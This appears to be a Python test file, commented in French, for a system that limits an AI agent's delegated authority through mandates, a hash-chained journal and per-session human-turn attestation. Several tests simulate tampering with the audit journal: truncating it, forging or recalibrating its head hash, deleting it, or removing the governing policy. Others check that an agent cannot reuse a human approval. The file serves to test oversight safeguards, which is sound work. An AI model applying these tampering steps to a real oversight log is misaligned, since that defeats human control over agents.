    store = MandateStore(project)
    mandate = _grant(project)
    store.revoke(md.REVOKE_MANUAL, "fin")
    _cut_last_line(store)
    head = store.journal.head_path
    last = json.loads(store.journal.path.read_text(encoding="utf-8").splitlines()[-1])
    head.write_text(json.dumps({"seq": last["seq"], "hash": last["hash"]}), encoding="utf-8")  # tête recalée
    state = store.state()
    assert not state.active and state.reason == md.REVOKED, state
    assert (store.journal.revoked_dir / mandate.id).is_file()


def test_a_missing_head_or_a_deleted_journal_with_a_head_carries_no_mandate(project: Path) -> None:
    store = MandateStore(project)
    _grant(project)
    head = store.journal.head_path
    assert head.is_file()
    kept = head.read_text(encoding="utf-8")
    head.unlink()  # journal non vide sans tête : on ne sait plus ce qui a été coupé
    assert store.state().reason == md.JOURNAL_UNREADABLE
    head.write_text(kept, encoding="utf-8")
    assert store.state().active
    store.journal.path.unlink()  # journal effacé alors que sa tête existe
    assert store.state().reason == md.JOURNAL_UNREADABLE
    with pytest.raises(JournalError):
        store.journal.append({"type": "revoke"})


def test_a_head_ahead_of_a_cut_journal_or_with_a_wrong_hash_is_refused(project: Path) -> None:
    store = MandateStore(project)
    _grant(project)
    store.register_session("s1", "worker", "T")
    head = store.journal.head_path
    good = json.loads(head.read_text(encoding="utf-8"))
    head.write_text(json.dumps({**good, "hash": "0" * 64}), encoding="utf-8")
    assert store.state().reason == md.JOURNAL_UNREADABLE
    head.write_text("pas du json", encoding="utf-8")
    assert store.state().reason == md.JOURNAL_UNREADABLE
    head.write_text(json.dumps(good), encoding="utf-8")
    assert store.state().active


# ── Échec fermé de chaque garde devant un journal rompu ─────────────────────────────────────────


def _break_journal(store: MandateStore) -> None:
    store.journal.path.write_text("pas du json\n", encoding="utf-8")


def test_a_broken_journal_refuses_every_guard(project: Path) -> None:
    from grimoire.missions.check_gate import ApprovalRefusedError, approve_checks_under_mandate

    store = MandateStore(project)
    task = _sealed_task(project)  # scellé écrit, journal sain
    _grant(project, gestures=("approve-check", "answer", "accept"))
    receipt = write_receipt(project, task.id, READY, reviewer_id="agent:rev", reviewer_session="s-r")
    _break_journal(store)
    with pytest.raises(MandateRefusedError) as sealed:
        store.verify_seal(task.id, task.checks)
    assert sealed.value.code == md.JOURNAL_UNREADABLE
    with pytest.raises((ApprovalRefusedError, MandateRefusedError)):
        approve_checks_under_mandate(project, task, actor="orch", provenance=PROV)
    with pytest.raises(MandateRefusedError) as unreadable:
        store.check_receipt_provenance(task, receipt)
    assert unreadable.value.code == md.JOURNAL_UNREADABLE
    with pytest.raises(MandateRefusedError):
        require_authority(project, "answer", task, ORIGIN_ORCHESTRATOR, what="Réponse", provenance=PROV)
    with pytest.raises(JournalError):
        store.seal_checks("T-9", task.checks)  # un scellé ne s'écrit pas sur un journal rompu
    with pytest.raises(JournalError):
        store.record_gesture(md.Authorization("MND-000000000000", "answer", "T"))


def test_service_answer_and_accept_refuse_under_a_broken_journal(project: Path) -> None:
    service = TaskService(project)
    tid = service.add("Q", ACC, owner="w", actor="w", ready=True).task.id
    service.context(tid)
    service.claim(tid, "w")
    service.transition(tid, TaskState.RUNNING, "w")
    service.ask(tid, "Quelle voie ?", "w")
    _grant(project)
    _break_journal(MandateStore(project))
    with pytest.raises(GrimoireMissionError):
        service.answer(tid, "voie A", "orch", origin=ORIGIN_ORCHESTRATOR, provenance=PROV)
    task = service.require(tid)
    with pytest.raises(GrimoireMissionError):
        accept_task(task, project, project / "ev", "ok", "orch", origin=ORIGIN_ORCHESTRATOR, provenance=PROV)


def test_cockpit_grant_on_a_broken_journal_is_a_clean_refusal(project: Path) -> None:
    from grimoire.tools.workspace_routes import workspace_post

    store = MandateStore(project)
    _grant(project)
    _break_journal(store)
    key = md.ensure_control_key().read_text(encoding="utf-8").strip()
    body = {"gestures": ["accept"], "task_types": ["implementation"], "max_sessions_per_day": 2, "until": "+1h"}
    with pytest.raises(ValueError, match="journal"):  # un 400 net, pas une connexion coupée
        workspace_post(project, "/api/workspace/autonomy/mandate/grant", {**body, "control_key": key})
    assert not store.state().active


def test_the_governing_policy_that_disappears_revokes_instead_of_delegating(project: Path) -> None:
    _policy(project, accept="orchestrator")
    _grant(project, gestures=("answer",))
    task = TaskService(project).require(_task(project))
    (project / STANDARD / "orchestration-policy.yaml").unlink()  # politique retirée : plus rien n'est délégué
    with pytest.raises(MandateRefusedError) as changed:
        MandateStore(project).authorize("answer", task, PROV)
    assert changed.value.code == md.POLICY_CHANGED
    assert not MandateStore(project).state().active


def _human_turn(project: Path, session: str) -> None:
    from grimoire.hosts.decisions import HookInput, run_decision
    from grimoire.hosts.events import HookEvent

    time.sleep(0.02)
    run_decision(
        "grimoire.task-context",
        HookInput(
            event=HookEvent.USER_PROMPT_SUBMIT,
            project_root=project,
            prompt="ok",
            session_id=session,
            host="host-claude-code-cli",
        ),
    )
    time.sleep(0.02)


def test_one_human_turn_grants_one_mandate_only_and_only_to_its_own_session(
    project: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Un agent ne rejoue ni le tour humain d'un autre mandat, ni celui d'une autre session."""
    store = MandateStore(project)
    first = MandateRequest.build(("accept",), ("implementation",), 2, "+1h")
    second = MandateRequest.build(("accept", "answer"), ("implementation",), 2, "+1h")
    monkeypatch.setenv("GRIMOIRE_SESSION_ID", "S1")
    assert store.request_grant(first)[0] is None
    _human_turn(project, "S2")  # le tour humain d'une autre session ne vaut pas
    assert store.request_grant(first)[0] is None
    _human_turn(project, "S1")
    mandate, _ = store.request_grant(first)
    assert mandate is not None
    # Le même tour ne sert pas une seconde décision, même relancée : il faut un nouveau tour humain.
    assert store.request_grant(second)[0] is None
    refused, attestation = store.request_grant(second)
    assert refused is None and not attestation.attested
    assert store.state().mandate is not None and store.state().mandate.gestures == ("accept",)
    _human_turn(project, "S1")
    assert store.request_grant(second)[0] is not None
